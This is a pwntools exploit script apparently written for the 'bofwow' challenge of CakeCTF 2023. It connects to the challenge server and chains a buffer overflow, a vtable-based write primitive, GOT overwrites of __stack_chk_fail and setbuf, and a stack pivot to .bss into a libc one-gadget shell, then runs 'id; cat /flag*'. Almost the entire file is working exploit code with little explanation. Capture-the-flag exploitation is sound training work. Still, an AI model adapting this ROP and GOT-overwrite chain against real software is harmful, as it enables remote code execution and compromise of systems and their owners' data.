#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("bofwow_patched")
libc = ELF("./libc.so.6")

# shortcuts
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)


rop = ROP(exe)

host, port = "bofwow.2023.cakectf.com", "9003"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

gadget_add = 0x00000000004012bc # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
set_rbx = 0x00000000004014c2 # mov rbx, dword ptr [rbp - 8] ; leave ; ret
pop_rbp = 0x00000000004012bd # pop rbp ; ret
add_rsp_8 = 0x0000000000401016 # add rsp, 8 ; ret
leave_ret = 0x00000000004013a3 # leave ; ret
ret = 0x40101a # ret

payload = p64(ret)
payload = payload.ljust(0x110, b'\x00')+p64(0x404710)+p64(0x4013ad)+p64(ret)*2
# overwrite vtable, to use it as a write primitive, will write the ret gadget to __stack_chk_fail got entry
payload += p64(0x404048)+p64(0x100)*3
sla('name? ', payload)
sla('you? ', str(0))

#Â write gadget on bss
payload = p64(0x40131b)
payload = payload.ljust(0x110, b'\x00')+p64(0x404708)+p64(0x4013ad)
sla('name? ', payload)
sla('you? ', str(0))
# write rbp on bss & pivot on bss
payload = p64(0x4047f0)
payload = payload.ljust(0x110, b'\x00')+p64(0x4046d8)+p64(leave_ret)
sla('name? ', payload)
sla('you? ', str(0))  

# overwrite return address of input:   std::cin >> _name & pivot on it
onegadget = 0xebdb3
# last payload set $rbx, change setbuf got entry to onegadget, & execute it to got shell
payload2 = p64(pop_rbp)+p64(0x404700)+p64(add_rsp_8)+p64(onegadget-libc.sym['setbuf'])+p64(set_rbx)+p64(pop_rbp)+p64(exe.got['setbuf']+0x3d)+p64(gadget_add)+p64(pop_rbp)+p64(0x404900)+p64(exe.sym['setbuf'])
sl(payload2)

sl('id; cat /flag*')

p.interactive()

